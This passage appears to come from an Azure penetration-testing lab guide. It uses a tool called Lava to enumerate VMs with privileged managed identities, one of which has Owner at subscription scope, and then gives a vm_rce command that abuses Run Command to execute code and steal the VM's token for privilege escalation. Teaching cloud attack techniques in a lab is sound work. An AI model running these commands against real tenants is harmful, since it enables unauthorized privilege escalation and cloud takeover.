Here is a screenshot of the command and its output. You can see from the screenshot that the module found a VM but the VM does not have an associated managed identity (1). You can also see that the module found another VM that has a privileged managed identity associated with it (2). The module also displays the role assigned to the VM and the role assignment scope (3):

```
```text
Lava $> exec vm_list_privileged
[+] getting vm's in subscription [+]
WARNING: Command group 'vm' is experimental and under development. Reference and support levels: https://aka.ms/CLI_refstatus
WARNING: Command group 'vm' is experimental and under development. Reference and support levels: https://aka.ms/CLI_refstatus
[++++++] vm found but not privileged [++++++]
[++++++++++++++++++++++++++++++++++++++++++++++++++]
{'app_id': '4aab270b-716b-441e-8753-41d09e5ade89',
 'managed_identity': 'SystemAssigned',
 'name': 'linuxvm01',
 'os': 'Linux',
 'privateIp': ['10.0.0.6'],
 'publicIp': ['51.140.11.174'],
 'resource_group': 'PENTEST-RG',
 'username': 'azureuser',
 'vm_size': 'Standard_DS1_v2'}
[{'role': 'Owner',
  'scope': '/subscriptions/204cce89-27de-4669-a48b-04c27255e05e'}]
[++++++++++++++++++++++++++++++++++++++++++++++++++]
```
```

![](bbox=[0.133, 0.215, 0.868, 0.531])

In total, the module should list two VMs (assuming you deleted the VM for the last chapter) with privileged role assignments: a Linux VM with the Owner role assignment at the subscription scope and a Windows VM with the Contributor role assignment. Make a note of the name (`linuxvm01`) and resource group (`pentest-rg`) of the Linux VM that was found with owner privileges. As we already have a credential with the Contributor role assignment, we will focus on exploiting the VM with the Owner role assignment to obtain its token for privilege escalation.

+   11. Use the `vm_rce` module to exploit the Run Command functionality as a Contributor. You will need to specify the VM name and resource group as shown here:

```
```shell
Lava $> exec vm_rce -rgrp PENTEST-RG -vm_name linuxvm01
```
```